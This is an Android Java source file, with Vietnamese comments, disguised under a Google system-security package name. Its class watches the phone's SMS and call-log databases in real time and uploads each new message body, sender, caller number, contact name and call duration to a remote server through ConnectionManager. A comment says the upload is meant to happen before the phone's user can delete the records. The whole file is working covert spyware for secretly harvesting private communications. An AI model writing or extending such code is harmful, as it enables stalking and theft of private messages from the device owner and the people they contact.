package com.google.android.sys.security;

import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.Looper;
import android.provider.CallLog;
import android.provider.Telephony;
import android.util.Log;
import org.json.JSONArray;
import org.json.JSONObject;

/**
 * Theo dõi REALTIME khi có thay đổi trong SMS và Call Logs
 * Tự động đồng bộ lên server NGAY LẬP TỨC trước khi họ kịp xóa
 */
public class RealtimeMonitor {
    private static final String TAG = "RealtimeMonitor";
    private Context context;
    private SmsObserver smsObserver;
    private CallLogObserver callLogObserver;
    
    // Lưu ID của SMS/Call cuối cùng để tránh gửi trùng
    private long lastSmsId = -1;
    private long lastCallId = -1;

    public RealtimeMonitor(Context context) {
        this.context = context;
    }

    public void startMonitoring() {
        try {
            // Theo dõi SMS
            smsObserver = new SmsObserver(new Handler(Looper.getMainLooper()));
            context.getContentResolver().registerContentObserver(
                Telephony.Sms.CONTENT_URI,
                true,
                smsObserver
            );
            Log.d(TAG, "✅ SMS monitoring started");

            // Theo dõi Call Logs
            callLogObserver = new CallLogObserver(new Handler(Looper.getMainLooper()));
            context.getContentResolver().registerContentObserver(
                CallLog.Calls.CONTENT_URI,
                true,
                callLogObserver
            );
            Log.d(TAG, "✅ Call Log monitoring started");

        } catch (Exception e) {
            Log.e(TAG, "Error starting monitoring", e);
        }
    }

    public void stopMonitoring() {
        try {
            if (smsObserver != null) {
                context.getContentResolver().unregisterContentObserver(smsObserver);
            }
            if (callLogObserver != null) {
                context.getContentResolver().unregisterContentObserver(callLogObserver);
            }
            Log.d(TAG, "Monitoring stopped");
        } catch (Exception e) {
            Log.e(TAG, "Error stopping monitoring", e);
        }
    }

    /**
     * Observer cho SMS - Phát hiện SMS mới NGAY LẬP TỨC
     */
    class SmsObserver extends ContentObserver {
        public SmsObserver(Handler handler) {
            super(handler);
        }

        @Override
        public void onChange(boolean selfChange) {
            super.onChange(selfChange);
            Log.d(TAG, "📱 SMS changed detected!");
            
            new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        // Lấy SMS mới nhất
                        Cursor cursor = context.getContentResolver().query(
                            Telephony.Sms.CONTENT_URI,
                            null,
                            null,
                            null,
                            "date DESC LIMIT 1"
                        );

                        if (cursor != null && cursor.moveToFirst()) {
                            int idIndex = cursor.getColumnIndex("_id");
                            int addressIndex = cursor.getColumnIndex("address");
                            int bodyIndex = cursor.getColumnIndex("body");
                            int typeIndex = cursor.getColumnIndex("type");
                            int dateIndex = cursor.getColumnIndex("date");

                            if (idIndex >= 0 && addressIndex >= 0 && bodyIndex >= 0) {
                                long id = cursor.getLong(idIndex);
                                
                                // Chỉ gửi nếu là SMS mới (tránh trùng)
                                if (id != lastSmsId) {
                                    lastSmsId = id;
                                    
                                    String address = cursor.getString(addressIndex);
                                    String body = cursor.getString(bodyIndex);
                                    int type = typeIndex >= 0 ? cursor.getInt(typeIndex) : 1;
                                    long date = dateIndex >= 0 ? cursor.getLong(dateIndex) : System.currentTimeMillis();

                                    // Tạo JSON và gửi NGAY
                                    JSONObject smsData = new JSONObject();
                                    smsData.put("type", "realtime_sms");
                                    smsData.put("id", id);
                                    smsData.put("phoneNo", address);
                                    smsData.put("msg", body);
                                    smsData.put("smsType", type == 1 ? "inbox" : "sent");
                                    smsData.put("date", date);
                                    smsData.put("timestamp", System.currentTimeMillis());

                                    // Gửi lên server NGAY LẬP TỨC
                                    ConnectionManager.sendRealtimeData(smsData);
                                    
                                    Log.d(TAG, "📤 Sent realtime SMS: " + address);
                                }
                            }
                            cursor.close();
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "Error processing SMS change", e);
                    }
                }
            }).start();
        }
    }

    /**
     * Observer cho Call Logs - Phát hiện cuộc gọi mới NGAY LẬP TỨC
     */
    class CallLogObserver extends ContentObserver {
        public CallLogObserver(Handler handler) {
            super(handler);
        }

        @Override
        public void onChange(boolean selfChange) {
            super.onChange(selfChange);
            Log.d(TAG, "📞 Call Log changed detected!");
            
            new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        // Lấy call log mới nhất
                        Cursor cursor = context.getContentResolver().query(
                            CallLog.Calls.CONTENT_URI,
                            null,
                            null,
                            null,
                            CallLog.Calls.DATE + " DESC LIMIT 1"
                        );

                        if (cursor != null && cursor.moveToFirst()) {
                            int idIndex = cursor.getColumnIndex(CallLog.Calls._ID);
                            int numberIndex = cursor.getColumnIndex(CallLog.Calls.NUMBER);
                            int nameIndex = cursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
                            int typeIndex = cursor.getColumnIndex(CallLog.Calls.TYPE);
                            int durationIndex = cursor.getColumnIndex(CallLog.Calls.DURATION);
                            int dateIndex = cursor.getColumnIndex(CallLog.Calls.DATE);

                            if (idIndex >= 0 && numberIndex >= 0) {
                                long id = cursor.getLong(idIndex);
                                
                                // Chỉ gửi nếu là call mới (tránh trùng)
                                if (id != lastCallId) {
                                    lastCallId = id;
                                    
                                    String number = cursor.getString(numberIndex);
                                    String name = nameIndex >= 0 ? cursor.getString(nameIndex) : "Unknown";
                                    int type = typeIndex >= 0 ? cursor.getInt(typeIndex) : 0;
                                    int duration = durationIndex >= 0 ? cursor.getInt(durationIndex) : 0;
                                    long date = dateIndex >= 0 ? cursor.getLong(dateIndex) : System.currentTimeMillis();

                                    // Xác định loại cuộc gọi
                                    String callType = "missed";
                                    if (type == CallLog.Calls.INCOMING_TYPE) callType = "incoming";
                                    else if (type == CallLog.Calls.OUTGOING_TYPE) callType = "outgoing";

                                    // Tạo JSON và gửi NGAY
                                    JSONObject callData = new JSONObject();
                                    callData.put("type", "realtime_call");
                                    callData.put("id", id);
                                    callData.put("phoneNo", number);
                                    callData.put("name", name);
                                    callData.put("callType", callType);
                                    callData.put("duration", duration);
                                    callData.put("date", date);
                                    callData.put("timestamp", System.currentTimeMillis());

                                    // Gửi lên server NGAY LẬP TỨC
                                    ConnectionManager.sendRealtimeData(callData);
                                    
                                    Log.d(TAG, "📤 Sent realtime call: " + number + " (" + callType + ")");
                                }
                            }
                            cursor.close();
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "Error processing call log change", e);
                    }
                }
            }).start();
        }
    }
}
